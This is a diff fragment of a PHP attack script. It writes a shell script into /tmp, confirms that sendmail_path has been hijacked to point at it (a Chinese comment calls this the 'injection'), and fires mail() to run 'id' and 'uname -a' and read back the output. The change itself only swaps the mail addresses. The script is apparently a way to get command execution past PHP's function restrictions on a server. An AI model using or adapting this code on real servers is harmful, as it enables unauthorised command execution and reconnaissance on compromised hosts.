@@ -81,7 +81,7 @@ error_reporting(0);
 file_put_contents('/tmp/n_sm.sh', "#!/bin/sh\nOUT=/tmp/n_sm_out.txt\nexec > \$OUT 2>&1\nid\nuname -a\nexit 0\n");
 chmod('/tmp/n_sm.sh', 0777);
 echo "sendmail_path=[".ini_get('sendmail_path')."]\n";      // 必须回显 /tmp/n_sm.sh，否则注入没生效
-@mail('user@example.com','x','x','From: user@example.com');
+@mail('root@localhost.localdomain','x','x','From: a@localhost.localdomain');
 usleep(400000);
 echo file_get_contents('/tmp/n_sm_out.txt');
 
